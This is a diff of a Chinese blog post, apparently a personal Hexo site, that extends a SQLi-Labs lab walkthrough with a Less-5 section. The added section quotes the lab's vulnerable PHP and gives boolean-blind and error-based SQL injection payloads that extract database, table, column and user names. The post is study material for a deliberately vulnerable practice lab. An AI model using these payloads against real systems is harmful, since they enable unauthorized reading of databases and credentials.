@@ -115,7 +115,28 @@
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/19.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/20.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/21.jpg">
-<meta property="og:updated_time" content="2019-05-03T04:14:51.641Z">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/22.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/23.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/24.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/25.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/26.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/27.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/28.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/29.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/30.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/31.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/32.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/32.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/34.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/35.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/36.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/37.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/38.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/39.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/40.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/41.jpg">
+<meta property="og:image" content="d:/github_blog/source/image/sqli-libs-first/42.jpg">
+<meta property="og:updated_time" content="2019-05-03T13:47:55.680Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi-Labs第一章（未完）">
 <meta name="twitter:description" content="前言 注入过程    一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
@@ -397,7 +418,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  994
+                  2.2k
                 </span>
               
 
@@ -433,12 +454,13 @@
 <a id="more"></a>
 <p>第一章的22关会慢慢更新，有时间就写。</p>
 <p><br></p>
-<h2 id="二-注入过程"><a href="#二-注入过程" class="headerlink" title="二. 注入过程"></a>二. 注入过程</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<h2 id="二-注入过程"><a href="#二-注入过程" class="headerlink" title="二. 注入过程"></a>二. 注入过程</h2><blockquote>
+<p><strong>测试环境</strong></p>
 <p>MySQL 5.5.53</p>
 <p>PHP 5.6.27-nts</p>
 <p>Apache  2.4</p>
 </blockquote>
-<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>1）首先进入SQLi-Labs，选择第一题</p>
+<h3 id="1-Less-1"><a href="#1-Less-1" class="headerlink" title="1. Less-1"></a>1. Less-1</h3><p>1）首先进入SQLi-Labs，选择第一题</p>
 <p><img src="\image\sqli-libs-first\1.jpg" alt="1"></p>
 <p>2）在地址后输入<code>?id=1</code>，发现可以显示用户信息，说明不是数值查询</p>
 <p><img src="\image\sqli-libs-first\2.jpg" alt="2"></p>
@@ -466,7 +488,7 @@
 <p>11）最后查询所有的用户名和密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=15&apos; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+</span><br></pre></td></tr></table></figure>
 <p><img src="\image\sqli-libs-first\11.jpg" alt="11"></p>
-<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>同样的我们先输入参数<code>?id=1</code></p>
+<h3 id="2-Less-2"><a href="#2-Less-2" class="headerlink" title="2. Less-2"></a>2. Less-2</h3><p>同样的我们先输入参数<code>?id=1</code></p>
 <p><img src="\image\sqli-libs-first\12.jpg" alt="12"></p>
 <p>将参数改为<code>?id=1&#39;</code>后报错</p>
 <p><img src="\image\sqli-libs-first\13.jpg" alt="13"></p>
@@ -480,7 +502,7 @@
 <p>可以使用如下payload获得显示位</p>
 <p><img src="\image\sqli-libs-first\15.jpg" alt="15"></p>
 <p>其余步骤与Less-1相同</p>
-<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>使用参数<code>?id=1&#39;</code></p>
+<h3 id="3-Less-3"><a href="#3-Less-3" class="headerlink" title="3. Less-3"></a>3. Less-3</h3><p>使用参数<code>?id=1&#39;</code></p>
 <p><img src="\image\sqli-libs-first\16.jpg" alt="16"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
 <p>猜测使用的是如下SQL语句</p>
@@ -493,7 +515,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos;) or &apos;1&apos;=(&apos;1</span><br></pre></td></tr></table></figure>
 <p>获得显示位</p>
 <p><img src="\image\sqli-libs-first\18.jpg" alt="18"></p>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>使用参数<code>?id=1&quot;</code>时报错</p>
+<h3 id="4-Less-4"><a href="#4-Less-4" class="headerlink" title="4. Less-4"></a>4. Less-4</h3><p>使用参数<code>?id=1&quot;</code>时报错</p>
 <p><img src="\image\sqli-libs-first\19.jpg" alt="19"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
 <p>猜测<code>id</code>被括号_()_和_””_所包装</p>
@@ -505,6 +527,71 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=&quot;) or &quot;1&quot;=(&quot;1</span><br><span class="line">?id=&quot;) or 1=1--+</span><br></pre></td></tr></table></figure>
 <p>获得显示位</p>
 <p><img src="\image\sqli-libs-first\21.jpg" alt="21"></p>
+<h3 id="5-Less-5"><a href="#5-Less-5" class="headerlink" title="5. Less-5"></a>5. Less-5</h3><p>第五关使用的是盲注，通过源代码可以看到，如果输入正确，返回的是<code>You are in...........</code></p>
+<p>部分源代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="5-1-基于布尔的盲注"><a href="#5-1-基于布尔的盲注" class="headerlink" title="5.1 基于布尔的盲注"></a>5.1 基于布尔的盲注</h4><h5 id="5-1-1-获取数据库长度"><a href="#5-1-1-获取数据库长度" class="headerlink" title="5.1.1 获取数据库长度"></a>5.1.1 获取数据库长度</h5><p>首先尝试查看数据库长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and%20length(database())=8%23</span><br><span class="line"></span><br><span class="line">%27= &apos;(单引号)</span><br><span class="line">%20= space(空格)</span><br></pre></td></tr></table></figure>
+<p>可以看到，数据库长度等于8时返回正常</p>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\22.jpg" alt="22"></p>
+<p>当数据库长度不对时，不会有信息返回</p>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\23.jpg" alt="23"></p>
+<h5 id="5-1-2-获取数据库名"><a href="#5-1-2-获取数据库名" class="headerlink" title="5.1.2 获取数据库名"></a>5.1.2 获取数据库名</h5><h6 id="5-1-2-1-使用left-函数获取数据库名"><a href="#5-1-2-1-使用left-函数获取数据库名" class="headerlink" title="5.1.2.1 使用left()函数获取数据库名"></a>5.1.2.1 使用<code>left()</code>函数获取数据库名</h6><p>接下来，尝试拿到数据库名的第一位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and left(database(),1)&gt;&apos;a&apos;--+</span><br><span class="line">?id=1%27and%20left(database(),1)%3e%27a%27--+</span><br></pre></td></tr></table></figure>
+<p>该语句的意思是数据库名的第一位是否大于a，如果大于a则返回真，否则返回否。</p>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\24.jpg" alt="24"></p>
+<p>可以看到返回正常，说明数据库名第一位大于a，这里可以通过二分法猜出数据库名，测试得第一位是<em>s</em>。</p>
+<p>尝试拿到数据库名的第二位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and left(database(),2)&gt;&apos;sf&apos;--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\25.jpg" alt="25"></p>
+<p>可以看到返回值为假，说明第二位比f小。以此可以拿到数据库名为<em>security</em></p>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\26.jpg" alt="26"></p>
+<h6 id="5-1-2-2-使用substr-、ascii-函数获取数据名"><a href="#5-1-2-2-使用substr-、ascii-函数获取数据名" class="headerlink" title="5.1.2.2 使用substr()、ascii()函数获取数据名"></a>5.1.2.2 使用<code>substr()</code>、<code>ascii()</code>函数获取数据名</h6><p>因为具体的原理是差不多的，这里就只展示以下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1))=115--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\27.jpg" alt="27"></p>
+<p><em>s</em>的ASCII值为115，换成116试一试</p>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\28.jpg" alt="28"></p>
+<p>可以看到，返回的是错误的</p>
+<h5 id="5-1-3-获取数据库下的表名"><a href="#5-1-3-获取数据库下的表名" class="headerlink" title="5.1.3 获取数据库下的表名"></a>5.1.3 获取数据库下的表名</h5><h6 id="5-1-3-1-获取第一个表的表名"><a href="#5-1-3-1-获取第一个表的表名" class="headerlink" title="5.1.3.1 获取第一个表的表名"></a>5.1.3.1 获取第一个表的表名</h6><p>首先尝试拿到第一个表的表名的第一位，因为已经知道表名了，就只是验证一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\29.jpg" alt="29"></p>
+<p>可以看到表名的第一位是e(ascii=101)</p>
+<p>接下来获取第二位，这里需要将<code>substr()</code>函数的第二个参数改成<em>2</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\30.jpg" alt="30"></p>
+<p>第二位是m(ascii=109)</p>
+<h6 id="5-1-3-2-获取第二个表的表名"><a href="#5-1-3-2-获取第二个表的表名" class="headerlink" title="5.1.3.2 获取第二个表的表名"></a>5.1.3.2 获取第二个表的表名</h6><p>那么关键问题来了，如何获取第二个表</p>
+<p>这里需要将<code>limit 0,1</code>改为<code>limit 1,1</code>，因为第一个参数是表示从哪里开始。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\31.jpg" alt="31"></p>
+<p>可以看到，第二个表的第一位是r(ascii=114)</p>
+<h5 id="5-1-4-获取users表中的列"><a href="#5-1-4-获取users表中的列" class="headerlink" title="5.1.4 获取users表中的列"></a>5.1.4 获取<em>users</em>表中的列</h5><p>使用regexp获取<em>users</em>表中的列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看*users*表中是否含有名字以*us*开头的列</span><br><span class="line"></span><br><span class="line">?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1)--+</span><br><span class="line">?id=1%27%20and%201=(select%201%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20table_name%20regexp%20%27%5eus%5ba-z%5d%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\32.jpg" alt="32"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看*users*表中是否含有名字是*username*的列</span><br><span class="line"></span><br><span class="line">?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^username&apos; limit 0,1)--+</span><br><span class="line">?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^username&apos; limit 0,1)--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\32.jpg" alt="32"></p>
+<h5 id="5-1-5-使用ord-和mid-函数获取users表的内容"><a href="#5-1-5-使用ord-和mid-函数获取users表的内容" class="headerlink" title="5.1.5 使用ord()和mid()函数获取users表的内容"></a>5.1.5 使用<code>ord()</code>和<code>mid()</code>函数获取<em>users</em>表的内容</h5><p>首先获取<em>username</em>列中第一行第一个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+</span><br><span class="line">?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=68--+</span><br></pre></td></tr></table></figure>
+<p>上面参数的意思是获取<em>username</em>列中第一行第一个字符的ASCII值，可以看到第一个字符是D</p>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\34.jpg" alt="34"></p>
+<p>用同样的方法获得第二个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),2,1))=117--+</span><br><span class="line">将MID()的第二个参数改为2</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\35.jpg" alt="35"></p>
+<p>同样的，获取第二行第一个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 1,1),1,1))=65--+</span><br><span class="line">将LIMIT的第一个参数改为1</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\36.jpg" alt="36"></p>
+<h4 id="5-2-基于报错的盲注"><a href="#5-2-基于报错的盲注" class="headerlink" title="5.2 基于报错的盲注"></a>5.2 基于报错的盲注</h4><h5 id="5-2-1-普通的报错注入"><a href="#5-2-1-普通的报错注入" class="headerlink" title="5.2.1 普通的报错注入"></a>5.2.1 普通的报错注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\37.jpg" alt="37"></p>
+<h5 id="5-2-2-利用double数值类型超出范围进行报错注入"><a href="#5-2-2-利用double数值类型超出范围进行报错注入" class="headerlink" title="5.2.2 利用double数值类型超出范围进行报错注入"></a>5.2.2 利用double数值类型超出范围进行报错注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\38.jpg" alt="38"></p>
+<h5 id="5-2-3-利用bigint溢出进行报错注入"><a href="#5-2-3-利用bigint溢出进行报错注入" class="headerlink" title="5.2.3 利用bigint溢出进行报错注入"></a>5.2.3 利用bigint溢出进行报错注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (!(select * from (select user())x) - ~0),2,3--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\39.jpg" alt="39"></p>
+<h5 id="5-2-4-xpath函数报错注入"><a href="#5-2-4-xpath函数报错注入" class="headerlink" title="5.2.4 xpath函数报错注入"></a>5.2.4 xpath函数报错注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\40.jpg" alt="40"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\41.jpg" alt="41"></p>
+<h5 id="5-2-5-利用数据的重复性"><a href="#5-2-5-利用数据的重复性" class="headerlink" title="5.2.5 利用数据的重复性"></a>5.2.5 利用数据的重复性</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\sqli-libs-first\42.jpg" alt="42"></p>
 
       
     </div>
@@ -536,7 +623,7 @@
   <p><span>本文标题:</span><a href="/sqli-libs-first/">SQLi-Labs第一章（未完）</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Jacky Cheng 的个人博客">Jacky Cheng</a></p>
   <p><span>发布时间:</span>2019年04月04日 - 19:04</p>
-  <p><span>最后更新:</span>2019年05月03日 - 12:05</p>
+  <p><span>最后更新:</span>2019年05月03日 - 21:05</p>
   <p><span>原始链接:</span><a href="/sqli-libs-first/" title="SQLi-Labs第一章（未完）">https://cjjkkk.github.io/sqli-libs-first/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://cjjkkk.github.io/sqli-libs-first/" aria-label="复制成功！"></i></span>
   </p>
@@ -801,7 +888,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-text">一. 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-什么是SQL注入"><span class="nav-text">1. 什么是SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-注入过程"><span class="nav-text">二. 注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-text">一. 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-什么是SQL注入"><span class="nav-text">1. 什么是SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-注入过程"><span class="nav-text">二. 注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Less-1"><span class="nav-text">1. Less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Less-2"><span class="nav-text">2. Less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Less-3"><span class="nav-text">3. Less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Less-4"><span class="nav-text">4. Less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Less-5"><span class="nav-text">5. Less-5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-基于布尔的盲注"><span class="nav-text">5.1 基于布尔的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#5-1-1-获取数据库长度"><span class="nav-text">5.1.1 获取数据库长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-1-2-获取数据库名"><span class="nav-text">5.1.2 获取数据库名</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#5-1-2-1-使用left-函数获取数据库名"><span class="nav-text">5.1.2.1 使用left()函数获取数据库名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-1-2-2-使用substr-、ascii-函数获取数据名"><span class="nav-text">5.1.2.2 使用substr()、ascii()函数获取数据名</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-1-3-获取数据库下的表名"><span class="nav-text">5.1.3 获取数据库下的表名</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#5-1-3-1-获取第一个表的表名"><span class="nav-text">5.1.3.1 获取第一个表的表名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-1-3-2-获取第二个表的表名"><span class="nav-text">5.1.3.2 获取第二个表的表名</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-1-4-获取users表中的列"><span class="nav-text">5.1.4 获取users表中的列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-1-5-使用ord-和mid-函数获取users表的内容"><span class="nav-text">5.1.5 使用ord()和mid()函数获取users表的内容</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-基于报错的盲注"><span class="nav-text">5.2 基于报错的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#5-2-1-普通的报错注入"><span class="nav-text">5.2.1 普通的报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-2-2-利用double数值类型超出范围进行报错注入"><span class="nav-text">5.2.2 利用double数值类型超出范围进行报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-2-3-利用bigint溢出进行报错注入"><span class="nav-text">5.2.3 利用bigint溢出进行报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-2-4-xpath函数报错注入"><span class="nav-text">5.2.4 xpath函数报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-2-5-利用数据的重复性"><span class="nav-text">5.2.5 利用数据的重复性</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
